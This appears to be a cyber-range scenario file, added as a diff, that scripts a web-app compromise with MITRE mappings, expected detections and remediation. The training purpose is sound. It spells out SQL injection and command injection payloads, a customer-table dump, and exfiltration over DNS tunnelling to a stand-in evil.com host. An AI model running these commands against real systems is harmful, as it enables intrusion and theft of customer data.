@@ -1,0 +1,188 @@
+{
+  "id": "webapp-compromise",
+  "name": "Web Application Compromise to Data Exfiltration",
+  "description": "Attacker discovers and exploits a vulnerable web application in the DMZ, pivots to the internal database, escalates privileges, and exfiltrates customer data.",
+  "difficulty": "intermediate",
+  "estimated_time_minutes": 30,
+  "attack_chain": "Recon -> SQLi -> DB Access -> Privesc -> Data Exfil",
+  "prerequisites": ["wazuh", "enterprise", "kali"],
+  "mitre_tactics": ["Reconnaissance", "Initial Access", "Execution", "Privilege Escalation", "Collection", "Exfiltration"],
+  "mitre_techniques": ["T1595.002", "T1190", "T1059.004", "T1548.003", "T1005", "T1048.003"],
+  "steps": [
+    {
+      "step_number": 1,
+      "technique": {
+        "technique_id": "T1595.002",
+        "technique_name": "Active Scanning: Vulnerability Scanning",
+        "tactic": "Reconnaissance",
+        "description": "Scan the DMZ network to discover the web application and open services.",
+        "target": "webapp",
+        "commands": [
+          "nmap -sV -sC 172.20.1.0/24",
+          "nikto -h http://172.20.1.20:8080"
+        ],
+        "prerequisites": []
+      },
+      "expected_detections": [
+        {
+          "source": "suricata",
+          "rule_id": "1000001",
+          "description": "Port scan detected from Kali",
+          "severity": "medium",
+          "max_detection_time_seconds": 30
+        }
+      ],
+      "investigation_hints": ["Check Suricata alerts for scan patterns", "Review source IP and timing"],
+      "remediation": ["Log the reconnaissance activity", "No blocking at this stage"]
+    },
+    {
+      "step_number": 2,
+      "technique": {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "description": "Exploit SQL injection in the login form to bypass authentication and access the admin panel.",
+        "target": "webapp",
+        "commands": [
+          "curl -X POST http://172.20.1.20:8080/login -d \"username=admin'--&password=x\"",
+          "sqlmap -u 'http://172.20.1.20:8080/api/v1/customers?search=test' --dbs"
+        ],
+        "prerequisites": ["T1595.002"]
+      },
+      "expected_detections": [
+        {
+          "source": "wazuh",
+          "rule_id": "302010",
+          "rule_group": "sqli",
+          "description": "SQL injection attempt in web application",
+          "severity": "high",
+          "max_detection_time_seconds": 15
+        },
+        {
+          "source": "suricata",
+          "rule_id": "1000010",
+          "description": "SQL injection pattern in HTTP traffic",
+          "severity": "high",
+          "max_detection_time_seconds": 10
+        }
+      ],
+      "investigation_hints": ["Check web access logs for SQLi patterns", "Correlate Wazuh and Suricata alerts"],
+      "remediation": ["Block source IP", "Review application code for parameterized queries"]
+    },
+    {
+      "step_number": 3,
+      "technique": {
+        "technique_id": "T1059.004",
+        "technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic": "Execution",
+        "description": "Use the command injection vulnerability in the network tools page to get a reverse shell.",
+        "target": "webapp",
+        "commands": [
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=;id'",
+          "curl -X POST http://172.20.1.20:8080/tools/ping -d 'host=;cat /etc/passwd'"
+        ],
+        "prerequisites": ["T1190"]
+      },
+      "expected_detections": [
+        {
+          "source": "wazuh",
+          "rule_id": "302030",
+          "rule_group": "command_injection",
+          "description": "Command injection via network tools",
+          "severity": "critical",
+          "max_detection_time_seconds": 10
+        }
+      ],
+      "investigation_hints": ["Check for unusual process execution on webapp container", "Review POST parameters"],
+      "remediation": ["Isolate the web server", "Disable the network tools endpoint"]
+    },
+    {
+      "step_number": 4,
+      "technique": {
+        "technique_id": "T1548.003",
+        "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+        "tactic": "Privilege Escalation",
+        "description": "Use exposed database credentials from the .env file or debug endpoint to access the database directly.",
+        "target": "db",
+        "commands": [
+          "curl http://172.20.1.20:8080/.env",
+          "curl http://172.20.1.20:8080/debug",
+          "psql -h 172.20.2.11 -U techvault -d techvault -c 'SELECT * FROM backup_config'"
+        ],
+        "prerequisites": ["T1059.004"]
+      },
+      "expected_detections": [
+        {
+          "source": "wazuh",
+          "rule_id": "302040",
+          "rule_group": "information_disclosure",
+          "description": "Access to sensitive files (.env, debug endpoint)",
+          "severity": "high",
+          "max_detection_time_seconds": 15
+        },
+        {
+          "source": "wazuh",
+          "rule_id": "304010",
+          "description": "Database connection from unexpected source",
+          "severity": "high",
+          "max_detection_time_seconds": 10
+        }
+      ],
+      "investigation_hints": ["Check for .env and /debug access in web logs", "Review database connection logs"],
+      "remediation": ["Rotate exposed credentials", "Remove debug endpoints", "Restrict database access by IP"]
+    },
+    {
+      "step_number": 5,
+      "technique": {
+        "technique_id": "T1005",
+        "technique_name": "Data from Local System",
+        "tactic": "Collection",
+        "description": "Dump customer data and backup configuration (including AWS credentials) from the database.",
+        "target": "db",
+        "commands": [
+          "psql -h 172.20.2.11 -U techvault -d techvault -c 'COPY customers TO STDOUT WITH CSV'",
+          "psql -h 172.20.2.11 -U techvault -d techvault -c 'SELECT * FROM backup_config'"
+        ],
+        "prerequisites": ["T1548.003"]
+      },
+      "expected_detections": [
+        {
+          "source": "wazuh",
+          "rule_id": "304030",
+          "rule_group": "exfiltration",
+          "description": "Large data export from sensitive tables",
+          "severity": "high",
+          "max_detection_time_seconds": 15
+        }
+      ],
+      "investigation_hints": ["Check database query logs for COPY/SELECT on customer data", "Review data volumes"],
+      "remediation": ["Revoke database access", "Audit what data was accessed", "Notify affected customers"]
+    },
+    {
+      "step_number": 6,
+      "technique": {
+        "technique_id": "T1048.003",
+        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
+        "tactic": "Exfiltration",
+        "description": "Exfiltrate collected data via DNS tunneling or direct HTTP transfer to the Kali box.",
+        "target": "dns",
+        "commands": [
+          "cat customers.csv | base64 | while read line; do nslookup $line.exfil.evil.com; done",
+          "curl -X POST http://172.20.4.30:8888/ -d @customers.csv"
+        ],
+        "prerequisites": ["T1005"]
+      },
+      "expected_detections": [
+        {
+          "source": "suricata",
+          "rule_id": "1000060",
+          "description": "DNS tunneling detected - excessive TXT queries",
+          "severity": "high",
+          "max_detection_time_seconds": 30
+        }
+      ],
+      "investigation_hints": ["Check DNS query logs for unusual patterns", "Look for encoded data in subdomains"],
+      "remediation": ["Block DNS to external resolvers", "Contain compromised systems"]
+    }
+  ]
+}
